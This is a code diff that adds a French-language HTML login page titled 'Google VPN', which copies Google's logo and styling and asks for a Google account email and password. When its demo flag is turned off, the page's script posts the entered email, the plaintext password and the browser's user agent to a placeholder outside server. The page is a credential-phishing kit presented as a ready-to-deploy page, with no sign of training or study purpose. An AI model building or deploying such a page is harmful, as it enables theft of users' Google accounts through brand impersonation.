@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google VPN - Connexion</title>
+    <style>
+        /* Google Fonts */
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            /*background-color: #882323;*/
+            margin: 0;
+            min-height: 100vh;
+            background-image: url("https://eliteprotech-url.zone.id/1771695708164k0b9uz.jpeg");
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #3c58aa;
+        }
+
+        .container {
+            max-width: 450px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            padding: 48px 40px 36px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .logo svg {
+            width: 75px;
+            height: 24px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin: 0 0 8px;
+            color: #202124;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-family: 'Google Sans', Roboto, sans-serif;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px #e8f0fe;
+        }
+
+        .input-field::placeholder {
+            color: #80868b;
+            font-size: 14px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 9px 24px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Google Sans', Roboto, sans-serif;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 8px;
+            height: 40px;
+            position: relative;
+        }
+
+        .btn:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        .btn:active {
+            background-color: #1557b0;
+        }
+
+        .btn:disabled {
+            background-color: #dadce0;
+            color: #80868b;
+            cursor: default;
+            pointer-events: none;
+        }
+
+        .btn-loader {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            margin-left: -9px;
+            margin-top: -9px;
+        }
+
+        .btn.loading .btn-text {
+            visibility: hidden;
+        }
+
+        .btn.loading .btn-loader {
+            display: block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 32px;
+        }
+
+        .footer-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .message {
+            margin-top: 24px;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+
+        .message.show {
+            display: block;
+        }
+
+        .message.success {
+            background-color: #e6f4ea;
+            color: #137333;
+            border: 1px solid #81c995;
+        }
+
+        .message.error {
+            background-color: #fce8e8;
+            color: #c5221f;
+            border: 1px solid #f1a1a1;
+        }
+
+        .security-text {
+            text-align: center;
+            color: #5f6368;
+            font-size: 12px;
+            margin-top: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <!-- Logo Google officiel -->
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92">
+                    <path fill="#EA4335" d="M115.75 47.18c0 12.77-10.48 21.95-23.36 21.95S69.03 59.95 69.03 47.18c0-12.77 10.48-21.95 23.36-21.95s23.36 9.18 23.36 21.95zm-10.23 0c0-7.96-5.78-13.42-13.13-13.42-7.35 0-13.13 5.46-13.13 13.42s5.78 13.42 13.13 13.42c7.35 0 13.13-5.46 13.13-13.42z"/>
+                    <path fill="#FBBC05" d="M163.06 47.18c0 12.77-10.48 21.95-23.36 21.95s-23.36-9.18-23.36-21.95c0-12.77 10.48-21.95 23.36-21.95s23.36 9.18 23.36 21.95zm-10.23 0c0-7.96-5.78-13.42-13.13-13.42s-13.13 5.46-13.13 13.42 5.78 13.42 13.13 13.42 13.13-5.46 13.13-13.42z"/>
+                    <path fill="#34A853" d="M209.5 26.8v38.44c0 15.82-9.33 22.33-20.36 22.33-10.38 0-16.69-6.96-19.07-12.68l8.94-3.72c1.59 3.82 5.5 8.32 10.13 8.32 6.64 0 10.76-4.1 10.76-11.83v-2.91h-.36c-2.49 3.07-7.3 5.76-13.38 5.76-12.68 0-24.32-11.05-24.32-25.28 0-14.33 11.64-25.38 24.32-25.38 6.08 0 10.89 2.69 13.38 5.66h.36V26.8h9zm-9.64 20.48c0-8.92-5.96-13.52-12.07-13.52-6.17 0-11.33 4.6-11.33 13.52 0 8.85 5.16 13.42 11.33 13.42 6.11 0 12.07-4.57 12.07-13.42z"/>
+                    <path fill="#4285F4" d="M224.26 4.54v64.59h-9.33V4.54z"/>
+                    <path fill="#EA4335" d="M262.76 55.68l8.1 5.39c-2.62 3.82-8.94 10.41-19.87 10.41-13.54 0-23.65-10.47-23.65-25.28 0-15.04 10.22-25.38 22.48-25.38 12.36 0 18.44 10.57 20.42 16.28l1.02 2.55-31.91 13.23c2.44 4.79 6.24 7.24 11.64 7.24 5.4 0 9.14-2.65 11.77-6.44zm-25.99-10.1l21.32-8.86c-1.17-2.96-4.69-5.02-8.82-5.02-5.29 0-12.64 4.67-12.5 13.88z"/>
+                  </svg>
+            </div>
+            <h1>Connexion</h1>
+            <p class="subtitle">Utilisez votre compte Google</p>
+
+            <form id="vpnForm">
+                <div class="form-group">
+                    <input type="email" id="email" class="input-field" placeholder="Adresse e-mail ou téléphone" required autocomplete="email">
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" class="input-field" placeholder="Mot de passe" required autocomplete="current-password">
+                </div>
+
+                <button type="submit" class="btn" id="submitBtn">
+                    <span class="btn-text">Se Connecter</span>
+                    <span class="btn-loader"></span>
+                </button>
+            </form>
+
+            <div id="message" class="message"></div>
+
+            <div class="footer-links">
+                <a href="/reboot" class="footer-link">Mot de passe oublié ?</a>
+                <a href="/create" class="footer-link">Créer un compte</a>
+            </div>
+
+            <div class="security-text">
+                <span>Français (France)</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const form = document.getElementById('vpnForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const messageEl = document.getElementById('message');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+
+            const DEMO_MODE = true; // À mettre à false en production
+
+            function isValidEmail(email) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            }
+
+            function showMessage(text, isSuccess) {
+                messageEl.textContent = text;
+                messageEl.className = 'message show ' + (isSuccess ? 'success' : 'error');
+                
+                if (isSuccess) {
+                    setTimeout(() => {
+                        messageEl.classList.remove('show');
+                    }, 4000);
+                }
+            }
+
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault();
+
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+
+                // Validations basiques
+                if (!email || !password) {
+                    showMessage('Renseignez votre email et mot de passe', false);
+                    return;
+                }
+
+                if (!isValidEmail(email)) {
+                    showMessage('Format d\'email invalide', false);
+                    return;
+                }
+
+                // Activation du loader
+                submitBtn.classList.add('loading');
+                submitBtn.disabled = true;
+
+                // Simuler un délai réseau
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                try {
+                    if (DEMO_MODE) {
+                        // Simulation succès
+                        console.log('Activation VPN pour:', email);
+                        showMessage('VPN activé avec succès', true);
+                        
+                        // Optionnel : réinitialiser les champs
+                        // emailInput.value = '';
+                        // passwordInput.value = '';
+                    } else {
+                        // Mode production
+                        const response = await fetch('https://votre-serveur.com/vpn', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ 
+                                email, 
+                                password,
+                                userAgent: navigator.userAgent
+                            })
+                        });
+
+                        const data = await response.json();
+
+                        if (response.ok && data.success) {
+                            showMessage('VPN activé avec succès', true);
+                        } else {
+                            showMessage(data.message || 'Erreur lors de l\'activation', false);
+                        }
+                    }
+                } catch (error) {
+                    console.error('Erreur:', error);
+                    showMessage('Erreur de connexion', false);
+                } finally {
+                    submitBtn.classList.remove('loading');
+                    submitBtn.disabled = false;
+                }
+            });
+
+            // Style Google au focus
+            [emailInput, passwordInput].forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.style.borderColor = '#1a73e8';
+                });
+                input.addEventListener('blur', function() {
+                    this.style.borderColor = '#dadce0';
+                });
+            });
+        })();
+    </script>
+</body>
+</html>
